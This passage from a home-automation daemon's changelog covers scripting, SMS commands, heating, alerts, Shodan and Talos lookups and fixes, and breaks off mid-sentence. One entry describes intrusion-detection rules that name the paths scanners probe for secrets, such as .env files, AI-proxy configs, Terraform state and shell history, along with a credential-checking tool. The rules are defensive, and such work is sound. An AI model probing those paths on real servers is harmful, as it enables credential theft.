**Procedures of their own:** `Plug-UPS.reboot()`, `Plug-UPS.reset_counters()`,
`Ban.run()` (a script calling a script, three deep at most),
`Kuchyne.press()` for a one-tap link, `Temp-Venek.rename(Outside)`,
`Vecer.add(Plug-UPS off)` / `Vecer.remove(Plug-UPS)`, and the same for action
groups.

**Functions with brackets**, from what was recorded:
`{Temp-Loznice.avg(temperature, 24h)}`, `min`, `max`, `delta` (last minus
first) and `count`, over any span from a minute to a year; Ctrl+Space writes
them with the reading picked out to be typed over.

**The marks reach further:** the boxes that choose what a rule, a button, a
link, an SMS command, a presence trigger or a scene's action acts on (the mark
follows the choice), the members of sensor and action groups, the people an
SMS goes to, the device column of Events, the chart legends of the overview,
and each History chart. Facts in Ctrl+Space are marked ƒ, and an open object
view follows the house every few seconds - never while a value is being typed
or text in it is selected.

4.88.0 — everything is an object, part three: by text message, and a help
that fits in one.

**The same syntax in a text** as in a script, through the same one door:

    Loznice.eco_c            ->  Loznice.eco_c = 20
    Loznice.eco_c = 19       ->  eco is worth 19 C in Loznice now
    Heating.away_on()        ->  away is on
    Settings.never_block = … ->  Not done: … keeps the house safe

Only from a number that may give commands; what keeps the house safe is
refused with the reason; a wrong value says what it takes. The three are
built-in commands of their own on the SMS card (topic *objects*), each with
its switch, and a command of your own with the same words still wins.

**Every answer of `help` is one message** - plain letters, 160 at most. A
modem sends a longer message part by part, and a three-part help was exactly
the reply the gateway was too slow to confirm on 21 September.

- `help` - where to start, with the topics and your own commands.
- `help heating` - the topic as examples using this house's own names
  (`Loznice eco 19`), not placeholders; `help house`, `help blocking` and the
  other short names work as well as the card's.
- `help rooms`, `help devices 2`, `help sockets` - the names a page at a time,
  what can be switched first rather than eighty buttons and door sensors.
- `help Loznice.` - what that object has: what to set, what to do, what to
  read.
- `help TOPIC` typed as written shows what to type instead, and a near miss
  (`help heatng`) is pointed at the topic it nearly was.

4.87.0 — everything is an object, part two: what an object says can be set is
set, and what it says can be done is done - from a script, and from the
object view itself.

**In a script**, as an editor writes it:

    Loznice.eco_c = 19
    Heating.away_c = {want}
    Settings.sms_poll_s = 30
    Topeni-Loznice.current_heating_setpoint = 21
    Vecer.run()
    Plug-UPS.pulse(900)
    Loznice.hold({t})

A property is set through the one road that already sets it - the heating
through its own commands, a setting through the same checks as the Settings
screen, a rule's switch through its own target - so nothing is written round
the side of anything. A procedure is the one line a script does it with today
(`Vecer.run()` is `on scene:…`), done with that line's checks. A value may
come from a message; what it is set on may not: a `{name}` left of the `=` is
not a setting. A line that cannot work is said when the script is saved -
nothing called that, a member that is worked out rather than set, one that
keeps the house safe, a missing value, a call to something that is not there -
and a wrong value is refused when it runs, with the range it takes.

**In the object view**, a settable value is a box on a click (Enter sets it,
with the PIN, and the view reads it back from the daemon), and every
procedure has a ▸ button. Ctrl+Space at the start of a script line offers,
after a name and a dot, what can be set (`eco_c = `) and what can be done
(`run()`), and nothing that can only be read.

What keeps the house safe stays read-only everywhere: the PIN, every password,
token and key, who may control it by text, who is never kept out, and the
blocking.

**An export "without secrets" carried some.** The socket passwords, the Wi-Fi
controller's API key and SSH password and every person's phone token went out
in the file that says it holds none; only the controller's password and SSH
key were left out. Now none of them are - and importing such a file keeps the
secrets the house already has for each socket, person and controller, rather
than wiping them.

4.86.0 — everything is an object, part one: every thing in the house has an
address, and says what it is.

**A small mark after every name.** A room, a socket, a device, a scene, a
script, a sequence, a rule, a schedule, a button binding, an alert message, a
person, a presence trigger, an action or sensor group, a one-tap link and its
keys, an SMS command of your own and every built-in one, a Zigbee gateway,
Wi-Fi presence, the heating, the house itself and the settings: each is an
object at `type:id` - `room:r092361`, `scene:f8f2a1bb` - an address that does
not change when it is renamed. The mark is quiet until pointed at, like the
globe beside a setting that needs the internet. In a name box of an editor it
sits inside the box's own right edge, and on a phone the big socket names keep
theirs in the card's corner, so no column moves: every tab and every section
was measured before and after, at desktop and phone width, and nothing wraps
that did not wrap before.

**What it opens is a class, as an editor shows one.** Properties (P) - what it
is set to; functions (ƒ) - what it answers now, read live; procedures (▸) -
what it can be told to do, with the line a script does it with today. Each
member says how to read it (`{Loznice.eco_c}`) and, where it can be changed
today, how (`heat Loznice eco 19`). A search box, copy by a click, and *Used
by*: the rules, scenes, links, commands and scripts that point at it. What
keeps the house safe - the PIN, every password, token and key, who may control
it by text, who is never kept out, the blocking - is shown with a lock and is
never going to be set from a script, a message or a fact. A secret is only
ever "set" or "not set", and an address or a phone number needs the PIN, as
it does everywhere else.

**`{Name.member}` reads any of it.** `{Settings.sms_poll_s}`, `{Heating.away_c}`,
`{House.inside_c}` (the same as `{inside_c}`), `{Vecer.actions}`,
`{Break-in.text}`, `{room:r092361.level}`. A name that two kinds of thing share
goes to the one it always meant - a device, then a room - and the other is
reached by its address; what a message said before this still says the same.

**Ctrl+Space knows them all.** After a name and a dot it offers the members,
each marked P or ƒ as an editor marks them (procedures are done, not quoted,
so they are not offered inside braces); before the dot it offers every object
under its own kind.

Setting properties (`Loznice.eco_c = 19`) and calling procedures
(`Vecer.run()`) from scripts, and then from a text message, are the next two
parts.

4.85.0 — what a week of the front server's logs (15-21 September 2026) taught
the detection, and snort.org's real limit.

**Replayed in order through the real counting**, 7,451 lines from the one-tap
road, the notification server and Suricata: 367 addresses were kept out and
nothing of the house's was; but ten addresses that had done something
unmistakable, and one that walked through twenty-one other people's sites via
this server, never were. Now:

- **A week's memory for the unmistakable.** One request for `.env` is still
  not a block; the same kind of thing again within seven days is (it was a
  day - one address asked for `.env` on the 16th and again on the 19th).
- **Next door counts.** The same unmistakable thing from an address in the
  same /24 (IPv6: /64) within ten minutes is one tool with two addresses:
  `216.73.160.56` and `.204` asked for `/wp-login.php` two seconds apart.
- **A slow round.** Twelve light things in a day - a name the server does not
  carry, a page that is not there, a knock, an odd method - from one address
  are a round done slowly, and a block. The busiest address that was rightly
  never kept out managed five; a phone whose shortcut is refused all day does
  not count towards it.
- **More paths that are asking for keys**: the config of an AI proxy (LiteLLM,
  "openai-proxy", Bedrock, by every name), Terraform state and variables, the
  deploy files of AWS, a shell's history, a Laravel log, FrontPage's password
  file. **More known ways in**: somebody else's phishing kit looked for as if
  this server were already broken into, WordPress set-up, FreePBX, Windows
  remote desktop. None of it matches anything the house asks for; that is
  guarded, as is an AI crawler's `/.well-known/mcp`, which is left alone.
- **TruffleHog.** It checked seven names and passwords against the
  notification server on 19 September, all refused. It only does that with
  credentials it found published next to this server's address, so it is now
  kept out *and* you are told - a warning, or an alarm if one of them worked.

**snort.org counts five requests to its list a minute, and the fifth shuts
the address out for a day** ("You have exceeded 5 requests to the blocklist
in under one minute"; the Retry-After ran to the minute a day after the fetch
that earned it). A fetch with the terms in the way is four requests. So now
at most four go out in any minute, counted in the database so a restart does
not forget them, and snort.org is fetched at most once every ten minutes,
whoever presses the button. `tools/snort-debug.py` no longer asks while
snort.org has said to wait (`--force` if you mean it), and says what the
answer means.

4.84.0 — an own SMS command no longer takes messages it was never meant for,
and a tool to see why snort.org says "too many requests".

**The matching was too loose, and the card was right about it.** A phrase
counted as the start of a message even inside a word - an own "off" answered
"offline", "status" answered "statusbar", "sms" answered "SMS-Gateway" - and
a word anywhere in a message was enough. So an own "off" that runs a scene
also took "heating off" and "Plug-UPS off", and ran that scene instead. The
start of a message now has to be whole words, and when an own command and a
built-in one could both take a message:

- an own command that is sure of it answers: the message is its phrase and
  nothing more, or it does something with the rest - a value, a name of its
  own, a script that is handed the words, an answer that quotes them;
- an own command that only found its word in a longer message gives way to a
  built-in one that understands the message whole - "heating off", "Plug-UPS
  off", "away 16" - and still answers when nothing else does, as it always
  did.

So "off" still runs your scene, "heating off" switches the heating off,
"away" still says you are out, "away 16" sets what away is worth, and "ban
1.2.3.4" still goes to your own ban, which takes the address. The card marks
a built-in command as taken only when an own one really does take it.

**tools/snort-debug.py** asks snort.org the way zigmon does, from the server,
and prints what came back at each step - the status, Cloudflare's ray and
kind of block, Retry-After, the start of any page given instead of the list,
the address it left from, and what zigmon has remembered about the list. It
never prints a cookie's value or a token, waits between requests, and stops
at the first "too many requests". See tools/README.md.

4.83.0 — snort.org asked politely, and your own SMS commands shown winning.

**snort.org stopped saying "too many requests".** The Talos list was asked for
every hour, and every time with an empty cookie jar - so every hour the terms
were agreed to afresh: the list, then the terms page, then the Accept, then
the list again, four requests where one would do, until Cloudflare answered
429 and kept answering it. And the list itself changes in months: the copy
fetched in September 2026 said it was last changed on 13 May. Now:

- the session snort.org hands out is kept between fetches, so the terms are
  agreed to once, and after that the list is one request;
- the list is asked for with what it was last time (ETag / Last-Modified),
  so an unchanged list is a "not modified" and its ranges are kept;
- snort.org itself is asked twice a day at most, whatever the other lists do;
- a 429 is a wait for as long as the site says (Retry-After), and nothing -
  not the clock, not the button - asks again before then.

From four requests an hour to one request twice a day. A Talos list taken
from a file or another address keeps the ordinary beat.

**Your own SMS command always wins, and the card now shows it.** A command
written on the SMS card is matched before any built-in one, so a built-in
command with the same words never runs. The card says so: the row turns
amber with its switch held and the reason beside it, and each room, socket or
script your own command takes is marked on its own - "loznice eco" written on
the card takes that one room and leaves the others to the built-in command.
Worked out each time, never stored: delete your own command and the built-in
one comes back with the switch it had. A one-word command with no `{name}` in
it is warned about in particular, since it answers *any* message with that
word anywhere in it - an own command called "off" takes "Plug-UPS off" and
"heating off" as well.

4.82.0 — the heating, and everything else, from a phone: commands that fill
themselves from the house, each with a switch.

**A room can be quoted by name.** `{Loznice.eco_c}`, `{Loznice.level}`,
`{Loznice.wanted_c}`, `{Loznice.why}`, `{Loznice.calling}`, `{Loznice.window}`
and the rest — what the heating knows about a room, in a message, in a
script, anywhere a fact goes. A device of that name still answers first, so
nothing that worked before reads differently. New house-wide facts too:
`{away_c}`, `{heating_levels}` and `{heating_wanted}`.

**A `heat` verb** for scripts, covering the whole of it in one word:
`heat off`, `heat away on`, `heat away 16`, `heat Loznice eco`,
`heat Loznice 21.5`, `heat Loznice eco 19`, `heat all night`. The levels
could already be reached from a phone through a target chosen in advance;
what a level is actually *worth* could be set on the Heating screen and
nowhere else — so the house could be put on eco from a phone, but eco
itself could not be turned down.

**What a text message already understands**, with nothing written on the SMS
card at all: the heating in full, `status`, `on`, `blocked`, `ban`, `unban`,
a socket by name (`Plug-UPS off`), a scene by name, a little script by name,
and any device or room by a word out of its name. A command written on the
card always wins over one of these, and only the numbers in `sms_allow`
reach them.

**They fill themselves.** These are families, not a fixed list: put up a
thermometer this morning and it can be asked about this afternoon, add a room
and its heating can be driven — each appearing on the card with a switch
of its own, and nothing to rewrite.

**A switch per command and a switch per thing**, on a new card under
Settings → SMS: switch off "hold a room at a temperature" everywhere, or
leave it on and switch off the one room nobody should be able to turn from a
phone. A whole topic goes off in one press. Switched off, a message saying
it is answered as though nobody understood it.

**Help enough to find the rest from a phone.** `help` gives the topics,
`help heating` gives that topic's commands and the rooms it covers,
`help Loznice` gives what may be said to that one room — and what has been
switched off is left out of all of them. Every answer fits in one message.

**One request instead of two.** The commands written on the card and the ones
the daemon already understands come back together, so the card asks once.

4.81.0 — an audit: what could hang the daemon, what it counted wrongly, and
what the page was doing every four seconds for nothing.

**A message’s loops cannot run away.** Each loop was capped at two hundred
turns, but nesting multiplies: three `{repeat 200}` inside one another made
eight megabytes of text in seven and a half seconds, and four would have
taken the machine’s memory. A whole rendering now has a budget between all
its loops - fifty thousand turns, two hundred thousand characters - and says
so in the message when it runs out. Three deep now takes 56 ms. This
mattered because the preview the editor asks for on every keystroke needs no
PIN, so writing a nested loop hung the daemon.

**{events_today} counts the day, not the newest four hundred events.** It
read four hundred rows and counted the ones inside the day, so any day busier
than that reported four hundred and stopped - on the house’s own database it
said 400 where the answer was 1073. Counted in the database now.

**{blocked_today} counts what was kept out today**, whether or not it is
still out. It counted only the list as it stands, and with the usual
hour-long ban everything older than an hour had already been swept into the
history - so a day that kept out dozens reported almost none of them. The
list and the history together, each address once.

**A loop inside a loop in a script** keeps its own place. All the loops share
one set of names - which is what makes `let` carry from turn to turn - so an
inner loop left its own last turn behind over the outer one’s: after it, the
outer loop thought it was on its last turn and a line quoting `{loop_first}`
was skipped altogether, because the name stood for nothing.

**A loop’s own name reads a device inside a script** now, as it always did
inside a message: `for x in …` then `say {x} is at {x.battery}%` looked for a
device actually called x and said nothing at all.

**A device whose name begins with a block word is a name.** `{If-Kitchen.state}`
counted as an `{if}`, and the block it opened swallowed the rest of the
message, which came out empty. The word has to stand on its own now.

**{x.money} keeps its hellers** - it rounded to two decimals and then threw
them away, so 1234.56 came out "1 234 Kč" and 0.99 came out "0 Kč".
**{x.hhmm}** is hours and minutes always: 45 seconds and 45 minutes both read
"0:45", and there was no telling them apart.

**The Shodan queue always has somebody working it.** An address already in
the queue was turned back at the door - before the code that starts a worker
- so a queue whose worker had gone after its five quiet minutes was never
emptied, and nothing more was asked about any address until some address
nobody had seen before was blocked.

**A terms page that writes value before name** is accepted properly: the two
readings of a hidden field hand their pairs back in opposite orders, and the
second went in as it came, making the CSRF token the *name* of a field.

**The ask-about buttons are a column.** Beside the address they ended
wherever that address ended - and a house address carries none at all - so a
page of them was a ragged edge rather than something the eye can run down. A
column of their own, in the block history and in the press history: eight
rows that had six different left edges now have one.

**The Examples button stayed shut.** Pressing it takes the focus off the box,
which starts the "shut the list in 150 ms" timer; the button then opened the
list, and the timer shut it again a breath later. It looked broken
everywhere - messages, text-message replies, link words, scripts. Anything
that opens the list now calls that timer off.

**A ready-made block carries its own braces**, so asking for one after a `{`
had already been typed no longer begins the message `{{if …`; and the list of
blocks goes when what is typed stops narrowing it, rather than standing over
the words being written and going back to all sixty-two at every space.

**The `{ } Facts` sheet and `⌘ Examples` write the same thing.** The sheet
wrapped every block in a pair of braces - including the whole messages that
*are* the message - and left the line breaks as the two characters they are
kept as, so a phone was sent a backslash and an n. Fourteen of the sixty-two
disagreed. One of them also carried a zero-width space, invisible in the box
and impossible to delete by looking at it.

**Every settings box carried an empty title**, and an empty title is still a
title attribute - so the four-second sweep that asks "is there a title left
anywhere?" answered yes for ever, and walked a page of twenty-seven thousand
nodes five times over, every four seconds, finding nothing to do. Ninety-seven
of them. None now.

**A house with no scripts asked for them every five seconds**, for as long as
the SMS or Public API tab was open, because "nothing here yet" never stopped
being true. Asked once.

**Previews cost half what they did.** Working out the two hundred facts walked
every device ten times over - the batteries three times each, the door
contacts twice - asked the same two questions of the database twice, and read
the backup folder off the disk on every call. On the house’s own database:
1.91 ms to 0.82 ms per preview, and the nine the messages card asks for from
19.5 ms to 7.1 ms.

4.80.0 — two lists on two keys, a button for each, and snort.org's "not so
fast" understood.

**Ctrl+Space is the facts** — every one of them, and nothing else. **Ctrl+Alt+
Space is the ready-made blocks** — all sixty-two for a message, all thirty-two
for a script, under their headings, with nothing trimmed and no "and N more".
Each list says at the top which it is, and the footer names the other key.
Typing narrows whichever list is open. Every writing desk has both on buttons
too: `{ } Facts` and `⌘ Examples` — a message, a script, a text command's
reply, a link's own words, the box that sends a text by hand.

**A block writes its own braces** now, since it is no longer typed after a
`{`, and a line break in a block is a line break rather than a backslash and
an n.

**snort.org's 429** is a wait, not a refusal: it says so in those words, the
list is left alone for six hours rather than retried hourly, and the Accept
button cannot be pressed three times in four seconds - the daemon answers the
second press with what the first one got.

**The names a script hands back** are offered on the tabs where they are
quoted: the script list is fetched there now (a request that never answered
held the flag for ever, so nothing was offered at all), and a name declared
twice is offered once.

**The "Gives back" sheet** is a grid: a brace, the name, what it holds,
whether a `let` line sets it, and the bin — with room between them.

4.79.0 — whose name is whose: every name says where it came from, and a
script declares what it gives back.

**Coming in.** A name a text command or a link hands a script is now there
four ways: plainly (`{ip}`), as the kind that gave it (`{sms.ip}`,
`{tap.ip}`), as whoever called it (`{in.ip}`), and under the caller's own
word (`{ban.ip}`, `{gate.ip}`). Two commands may each have a name called ip
and neither means the other's, and inside one script they can now be told
apart. Writing a script, Ctrl+Space offers them all, each saying which
command or link it comes from.

**Going back.** A script's own names are there as `{room}`, `{out.room}` and
`{skript01.room}` — the script's name as the word before the dot, so
`"Spustil se skript {Skript01.returnvar01}"` means that script's, whatever
else is in play. The same for `{result}`, `{said}`, `{ok}` and `{failed}`.

**A button for it.** Every script has `{ } Gives back`: write down the names
it hands back, with a word about what each holds, and one press takes the
ones its `let` lines already make. Written down, they are offered wherever an
answer is written — a text command's reply, a link's own words — and a name
that is declared but never set fills as empty rather than standing there in
braces. The row says `gives back {…}`, and Try it shows the answer and the
names.

**Shodan and Talos buttons** are on the block history and on the addresses on
their way to being kept out, as well as on the kept-out list and the presses.

**The templates** match on whole words now: typing `un` brings up *unless*,
not everything with those letters somewhere in it. On a script's line the
verbs come first and the ready-made blocks follow.

4.78.0 — sixty-two ready-made blocks for a message and thirty-two for a
script; a script answers in its own words, and a text or a link may quote
what it worked out.

**The templates.** Ctrl+Space and the `{ }` Facts picker now carry a library
rather than three examples, under headings: Questions (twenty-five, from a
plain `if` to brackets, `contains`, `in`, a device's own reading, the
weekend, the hour of the clock), Loops (thirteen, including a loop over a
written-out list, a loop with a question inside it, and a loop whose name
asks the device for its readings), Lists and numbers, Time, and six whole
messages ready to edit. Scripts get thirty-two of their own, including
`while`, `repeat`, `break`, `next`, `let` and six whole scripts. With nothing
typed the list shows one of each heading and says how many more there are;
typing `if`, `for`, `loop`, `time` or `message` brings out the rest.

**A loop's name reaches the device too.** `{for d in quiet_list}{d} —
battery {d.battery}%\n{end}`: the name the loop made up stands for a device
as well as for a word, so a loop can say something about each of them rather
than only listing them.

**A script answers.** New verb `answer …` says what goes back to whoever
asked. What a script leaves behind is then a fact for the answer to quote:
`{result}`, `{said}`, `{ok}`, `{failed}`, `{failed_n}`, `{said_lines}`,
`{lines_done}`, `{script}` — and every name it gave something with `let`. A
text command's reply and a one-tap link's own words both fill from those, so
a script that works something out can finally say it. A link that runs a
script has a writing desk of its own now; leave it empty and the script's
answer goes back as it is. Try it shows the answer and the names.

**The internet mark** is the globe again, the icon alone, beside the label.

4.77.0 — the Talos terms accepted with a button; Shodan asked the moment an
address is kept out; while, repeat, break, next and a name of your own; time
in every shape; thirty-seven more facts.

**The Talos list, in one press.** Settings → Blocking → the list's own row now
carries *Accept the terms and fetch* and a link to the terms themselves. The
button says the terms are accepted, keeps that with the settings, presses
Accept on snort.org the way a browser does — its own form, its own token, its
own cookie — and fetches the list at once; from then on it is fetched by
itself like every other list. The page snort.org really serves is kept as a
test fixture, because the first form on it is a search box carrying
`accept-charset="UTF-8"`, and posting the terms to `/search` is how a careless
reading of "accept" ends up looking like a refusal. If snort.org ever refuses
a program, the row says so and the link is the way through by hand.

**Shodan, the moment an address is kept out.** It was two threads and whatever
they could catch: a scan blocks a dozen addresses in a second and most of the
list had nothing beside it until each was opened by hand. It is a queue now,
worked through one question a second, and what comes back is kept — so the
list has it the next time anybody looks. Every way an address is kept out asks
(the detection, by hand, the API), and every ten minutes a sweep fills in the
ones still missing. *Ask again* is still there for a fresh answer.

**More ways to say it.** Scripts gained `while …`, `repeat N`, `break`,
`next` and `let a-name something`; a loop goes round two hundred times at
most and a script four hundred lines, and a `while` that never ends says so.
Messages gained `{unless …}`, `{repeat N}` and a list written on the spot —
`{for p in Plug-UPS, Plug-TV}`.

**Time, in every shape it arrives in.** Twenty-four more turns read a fact as
a moment (seconds since the epoch, an ISO stamp, `18:42`) or as a length
("2 h 14 min", `9312`) and write it as you like: `.time`, `.time_s`, `.date`,
`.date_cz`, `.datetime`, `.day`, `.dayname`, `.month`, `.monthname`, `.year`,
`.hour`, `.minute`, `.week`, `.daypart`, `.today`, `.epoch`, `.iso`, `.ago`,
`.until`, `.duration`, `.hhmm`, `.hours`, `.minutes`, `.seconds`, plus
`.clock:%d.%m. %H:%M`, `.plusdays:1`, `.plushours:2` and `.plusmins:25`. Only
the letters that say a part of a date or a time are allowed through to
strftime. Eighty turns in all, thirty-three of them carrying something of
their own.

**Thirty-seven more facts**, two hundred and two in all: `{now}` (the moment
itself, which takes every time turn), `{today}`, `{tomorrow}`, `{yesterday}`,
`{hour}`, `{minute_now}`, `{month_now}`, `{month_name}`, `{year}`, `{week}`,
`{daypart}`, `{weekend}`, `{workday}`, `{sunrise_in}`, `{sunset_in}`,
`{plugs_off}`, `{plugs_off_list}`, `{lights_off_list}`, `{power_kw}`,
`{offline_list}`, `{rooms_list}`, `{room_temps}`, `{coldest_c}`,
`{warmest_c}`, `{humidity_avg}`, `{motion_last}`, `{last_event}`,
`{last_event_ago}`, `{blocked_today}`, `{blocked_last_ago}`, `{feeds_on}`,
`{feeds_ranges}`, `{intel_known}`, `{disk_free_pct}`, `{memory_free_pct}`,
`{cpu_temp}` and `{alerts_hushed}`. Ctrl+Space offers ready-made blocks for
all of it, each one written out whole with the part to change picked out.

4.76.0 — a message can ask a question and go round a list, and so can a
script; the picker writes the block for you.

**Questions.** `{if …}…{else}…{end}` in anything that writes text, with
`{else if …}` between them. A condition compares a fact with a number or with
words — `{if {temp} < 5}`, `{if who_home contains Jana}`, `{if Plug-UPS in
plugs_on_list}` — and `and`, `or`, `not` and brackets put several together.
A name on its own asks whether it says anything at all: `{if anyone_home}`.
Nothing here runs code that anybody typed: the condition is read into a tree
of its own and walked.

**Loops.** `{for p in plugs_on_list}• {p}\n{end}` writes a line for each
thing in a list, with `{loop_i}`, `{loop_n}`, `{loop_first}` and `{loop_last}`
inside it. Two hundred turns at most.

**Scripts too.** `if`, `else`, `end` and `for … in …` are lines of a script
now, nested as deep as makes sense. A script is refused when a block is left
open, and a loop inside a loop stops at four hundred lines rather than running
all afternoon.

**Twenty-nine more turns of phrase**, and these carry something of their own
after a colon: `{who.default:nobody}`, `{temp.add:1.8}`, `{list.join: · }`,
`{name.left:12}`, `{list.nth:2}`, `{list.has:Plug-UPS}`, `{power.divide:1000}`,
`{x.say:the words}`. Plus `sum`, `avg`, `max`, `min`, `int`, `floor`, `ceil`,
`money`, `kwh`, `watts`, `kw`, `not` and `yes`. Fifty-six in all, every one
offered by the page and done by the daemon — `test/facts.py` refuses a release
where those two lists differ.

**The picker writes it for you.** Ctrl+Space (and the `{ }` Facts button) has
a *Ready-made blocks* section: an if, an if/else, a three-way if, a loop, a
numbered loop, a loop with an if inside it — and the same for scripts. Taking
one writes the whole block, correctly formatted, and leaves the part worth
changing selected, so it is edited rather than typed. The list has a footer
saying what the keys do, and shows what each block would write.

4.75.1 — the rail no longer moves under the pointer, and the marks that say
a setting needs the internet cost no width.

**The rail.** Its find box had a row of its own that existed only while the
rail was open, so opening it pushed every icon down and the one being pointed
at slid away. The box sits on the pin's row now, and a section heading keeps
the height of its own text when it is shut, so the rows stand still whether
the rail is open or closed.

**The internet mark** rides on the info button that is already beside each
setting — a blue ring with a dot — rather than as a word in the label. The
word cost forty pixels in every label that had it, which wrapped labels and
dropped the boxes under them out of line. What it reaches is still said under
the pointer. **The lists somebody else keeps** line up again too: the message
about a list that would not download was landing in the three-column grid as a
fourth cell and shifting every row under it.

**The Editing bar's** lock and the time left sit at the right edge of the page.

4.75.0 — Shodan laid out to be read; what needs the internet says so.

**Shodan.** With a key (Membership or above) the whole record is read and
drawn as a card: where the address is and who owns it (network, provider,
AS, cloud, system, names, domains, when Shodan last saw it); its tags, with
scanner, tor, VPN and the like in red; every open port; a box per port with
the software and version, the HTTP status and page title, the technologies
behind the page, the certificate (name, issuer, expiry - red when expired)
and the TLS versions; and the known holes worst first, each with its CVSS
score in a colour, whether Shodan verified it, which port it is on, what it
is, and a link to NVD. The worst score is a badge at the top of the card.

**The internet mark.** Every setting that only works with the internet
carries a small "internet" mark, and pointing at it says what it reaches:
the weather, the block lists, the country list, Shodan, Talos, Duo, ntfy and
Telegram (on the roads in Notifications too). A text goes over the mobile
network and is not marked.

4.74.0 — every kind of message on its own road: 49 kinds, from 22;
the Talos list moved; a Shodan key used in full.

**New kinds that nothing told before.** Water on the floor, smoke, gas or
carbon monoxide, a case opened (Safety); a battery going under the warning
and again under the critical line, once per battery; a room leaving the
temperature or humidity range and coming back (half a degree, three percent
of slack); a Shelly box protecting itself (overheating, overload, bad
voltage); the whole house over `alert_power_w`; the last person leaving
while sockets or lights are on (starts quiet); a new device joining the
Zigbee network (starts quiet); the machine itself - disk, memory, processor
temperature (`alert_disk_free_pct`, `alert_memory_free_pct`,
`alert_cpu_temp_c`); zigmon starting, with how long it was away (starts
quiet); a block list that would not download (starts quiet). Each is told
at its edge, never on every report that repeats it, and not after a restart
for what was already so before it.

**Warnings that became kinds.** Some forty warnings in the events reached
anybody only as "a warning", along with every other one. Each belongs to a
kind now: a device leaving the network, a switch that did not confirm,
Zigbee2MQTT's own errors, a socket's MQTT road, a rule at its hourly limit,
something pointing at what is gone, rules or settings lost, imports on
trial, the text gateway struggling, the day's texts used up, presses
waiting for approval, a secret handed out, one-tap links changed, recorded
data erased or restored, too much at once. Left alone, each goes exactly as
it did (as a warning, by section 2); given roads, it takes them and only
them; switched off, it is only written down.

**Talos.** Talos moved its list to snort.org in September 2024, behind terms
accepted with a click, and the old address answers 403. It is fetched from
snort.org now; when that refuses, the list says why, in the Settings row, and
is not asked again for an hour (it was every half minute). New setting
`feed_talos_url`: a file this machine keeps (accept the terms in a browser,
download it daily) or another address.

**Shodan with a key.** The full host record rather than the minified one:
what answers on each port, its software and version, the page title, the
certificate, the holes per service, city and domains. An answer InternetDB
gave before the key was there is no longer shown for a week - the next
question goes to the API. The API's one question a second is kept, and a
"too many" is waited out rather than shown.

4.73.0 — a strip switched as one scene no longer trips over the polling;
Shodan and Cisco Talos for an address.

**The four-socket scene.** A box answers only a few requests a second. Since
4.71 a strip is read every round (15 s) rather than every other one, and a
round that landed on a scene - or the read that confirms the switch, which
went at 300 ms, in the middle of the four commands - was the request too
many: the box refused one socket and it moved a second later. Measured
against a box that refuses past four requests a second, twelve scenes each:
25 refusals and a worst of 1.5 s before; one refusal now. What changed:
* a box being switched (a command in the last 3 s, or one still queued) is
  left out of the polling round - the read after the switch says the same;
* the read that confirms a switch waits until the burst is over and the
  box's own second has passed, then reads the box once.
Scenes built with a second between their steps (*TVLoznice-All-ON*) still
take those seconds; that is how they are written.

**What others know about an address** (Settings -> Blocking, all off as it
comes):
* **Shodan** - a Shodan button on every address kept out, every press of a
  link from outside and every *Ask about it*: open ports, names, tags such as
  *scanner*, known holes, the software it answers with. Without a key it is
  InternetDB (free, refreshed weekly); with a key, the full record - who
  owns the network, the system, when Shodan last saw it. An answer is kept
  for a week (settable); the house's own addresses and anything under Never
  kept out are never sent. *Ask Shodan about every address kept out* asks
  in the background, two at a time, and shows the answer on its line. The
  key is kept as a secret: never sent to the page, never in the log or an
  error, and only in an export with secrets.
* **Cisco Talos** has no public way to be asked about one address, so it
  comes two ways: the *Cisco Talos IP block list* among the lists somebody
  else keeps, and a Talos button that opens its reputation page for the
  address - with a line saying whether its list names it.

4.72.0 — every kind of alert checked, named for what it is, grouped, and
five new ones; the page drawn in its final shape from the first frame.

**Checked, and what was wrong.** Every kind on the card was set in turn to
follow the house, to be off, and to take roads of its own, and sent:
* **Your own alerts** (was *A written alert of your own*) did not govern the
  written messages at all - they were sent as another kind - so switching it
  off or giving it its own roads changed nothing. It does now; a message's own
  three switches still narrow it further.
* **A caller that named its roads went past the kind altogether**: a written
  message, a text from a stranger. Both now have to allow a road.
* **A device gone quiet** was sent with "nothing heard for 3 h" where its
  level belonged: it arrived without the time and without being a warning.
  The same for the mesh losing members.
* Four kinds promised more than anything sent: *the broker or the bridge -
  lost, regained*, *backups - and when one comes back*, *editing and keys -
  unlocked, a PIN refused*, *the text gateway - the modem, the SIM, what is
  left*. What they promise is sent now, or the words say only what is.

**Named and grouped.** Under six headings - Devices and Zigbee, Home,
Summaries, Texts and links, Security and network, System - each kind says
what it is and what it covers.

**New kinds**, each with something that sends it:
* *The Zigbee network is unsettled* - several devices quiet at once, or
  devices leaving the mesh (split from one device going quiet).
* *Zigbee2MQTT stops or comes back* - was written in Events and never said.
* *The MQTT broker* - now says when it is back, not only when it is lost.
* *The PIN refused again and again* - somebody guessing, until editing locks.
* *Editing unlocked* - and from where; quiet until you give it roads, since
  it would be news every time you open the dashboard.
* *Backups* - and the first one that works again after a failure.
* *A link used from a new place* is what *Editing and keys* actually sent.

The three kinds that are about devices (one gone quiet, the network, a
sensor that forgot its setup) also wait for *going offline* in section 2,
and the card now says so on those rows when that is off.

**F5.** The page was drawn narrow first and widened half a second later
when its script ran; it is wide from the first frame, and a page opened on
another tab no longer shows Overview for a moment first.

4.71.0 — the house measured end to end, and the page made to keep up; the
iPad.

**Measured.** A bench runs the daemon as it runs at home - a real broker, a
mock Shelly box on its own address for every box in the house's list, a
Wi-Fi-like 30 ms each way - and times each road from the moment something
happens to the moment the box is told and the page shows it. A Zigbee
button to the box: 33 ms, which is the Wi-Fi itself; a strip socket, a
scene, motion to a light: the same. The dashboard's own switch: told in
32 ms, pages woken in 35. With eighty reports a second, three pages open
and a log sweep running: 34 ms, worst 52. With one box gone silent: nothing
else slows. None of the heavy jobs (roll-ups, backups, weighing a log)
delays a press by more than a breath.

* **A strip read every other round.** A box asked 14.98 s after its last
  reading was "not due" and skipped a whole round, so a four-way strip was
  read every 30 s and a socket switched at its own button took up to half a
  minute to show. Now every round, 15 s at most. (A box that publishes over
  its own MQTT is seen at once: 1.5 ms from its message to the pages being
  woken. None of the boxes here does yet - *Set the box up* on its MQTT
  strip is what makes a wall switch show instantly.)
* **A button's light shows twice as fast.** The button's own report woke
  the page, and the light's answer 30 ms later had to wait out a 150 ms
  window before the next fetch. A change that arrives while a fetch is out
  now rides on that fetch. Button to card on the page: 80 ms, was 180.
* **Compressed.** The status the page fetches on every change is a third of
  a megabyte and goes out gzipped to a browser that takes it: 34 kB.
* **Repaints that change nothing leave the page alone.** On a phone-speed
